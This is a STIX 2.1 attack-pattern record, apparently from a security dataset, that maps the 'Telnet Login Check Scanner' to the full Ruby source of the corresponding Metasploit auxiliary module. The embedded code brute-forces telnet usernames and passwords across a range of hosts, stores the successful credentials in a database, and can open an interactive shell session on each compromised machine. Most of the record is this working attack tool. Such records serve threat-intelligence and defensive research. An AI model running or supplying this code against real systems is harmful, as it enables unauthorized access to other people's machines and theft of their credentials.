{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--2a8ee4b9-5121-4e39-b942-88bed56c8c46",
    "created": "2024-08-14T16:26:43.499073Z",
    "modified": "2024-08-14T16:26:43.499076Z",
    "name": "Telnet Login Check Scanner",
    "description": " This module will test a telnet login on a range of machines and report successful logins.  If you have loaded a database plugin and connected to a database this module will record successful logins and hosts so you can track your access. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/telnet/telnet_login.rb",
            "external_id": "telnet_login.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "1999-0502#Weakpassword"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'metasploit/framework/credential_collection'\nrequire 'metasploit/framework/login_scanner/telnet'\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Telnet\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::AuthBrute\n  include Msf::Auxiliary::Scanner\n  include Msf::Auxiliary::CommandShell\n\n  def initialize\n    super(\n      'Name'        => 'Telnet Login Check Scanner',\n      #\n      'Description' => %q{\n        This module will test a telnet login on a range of machines and\n        report successful logins.  If you have loaded a database plugin\n        and connected to a database this module will record successful\n        logins and hosts so you can track your access.\n      },\n      'Author'      => 'egypt',\n      'References'  =>\n        [\n          [ 'CVE', '1999-0502'] # Weak password\n        ],\n      'License'     => MSF_LICENSE\n    )\n\n    register_advanced_options(\n      [\n        OptInt.new('TIMEOUT', [ true, 'Default timeout for telnet connections.', 25])\n      ], self.class\n    )\n\n    deregister_options('PASSWORD_SPRAY')\n\n    @no_pass_prompt = []\n  end\n\n  attr_accessor :no_pass_prompt\n  attr_accessor :password_only\n\n  def run_host(ip)\n    cred_collection = build_credential_collection(\n        username: datastore['USERNAME'],\n        password: datastore['PASSWORD']\n    )\n\n    scanner = Metasploit::Framework::LoginScanner::Telnet.new(\n        host: ip,\n        port: rport,\n        proxies: datastore['PROXIES'],\n        cred_details: cred_collection,\n        stop_on_success: datastore['STOP_ON_SUCCESS'],\n        bruteforce_speed: datastore['BRUTEFORCE_SPEED'],\n        connection_timeout: datastore['Timeout'],\n        max_send_size: datastore['TCP::max_send_size'],\n        send_delay: datastore['TCP::send_delay'],\n        banner_timeout: datastore['TelnetBannerTimeout'],\n        telnet_timeout: datastore['TelnetTimeout'],\n        framework: framework,\n        framework_module: self,\n        ssl: datastore['SSL'],\n        ssl_version: datastore['SSLVersion'],\n        ssl_verify_mode: datastore['SSLVerifyMode'],\n        ssl_cipher: datastore['SSLCipher'],\n        local_port: datastore['CPORT'],\n        local_host: datastore['CHOST']\n    )\n\n    scanner.scan! do |result|\n      credential_data = result.to_h\n      credential_data.merge!(\n          module_fullname: self.fullname,\n          workspace_id: myworkspace_id\n      )\n      if result.success?\n        credential_data[:private_type] = :password\n        credential_core = create_credential(credential_data)\n        credential_data[:core] = credential_core\n        create_credential_login(credential_data)\n        print_good \"#{ip}:#{rport} - Login Successful: #{result.credential}\"\n        start_telnet_session(ip,rport,result.credential.public,result.credential.private,scanner) if datastore['CreateSession']\n      else\n        invalidate_login(credential_data)\n        vprint_error \"#{ip}:#{rport} - LOGIN FAILED: #{result.credential} (#{result.status}: #{result.proof})\"\n        disconnect(scanner.sock)\n      end\n    end\n  end\n\n  def start_telnet_session(host, port, user, pass, scanner)\n    print_status \"Attempting to start session #{host}:#{port} with #{user}:#{pass}\"\n    merge_me = {\n      'USERPASS_FILE' => nil,\n      'USER_FILE'     => nil,\n      'PASS_FILE'     => nil,\n      'USERNAME'      => user,\n      'PASSWORD'      => pass\n    }\n\n    start_session(self, \"TELNET #{user}:#{pass} (#{host}:#{port})\", merge_me, true, scanner.sock)\n  end\nend\n"
}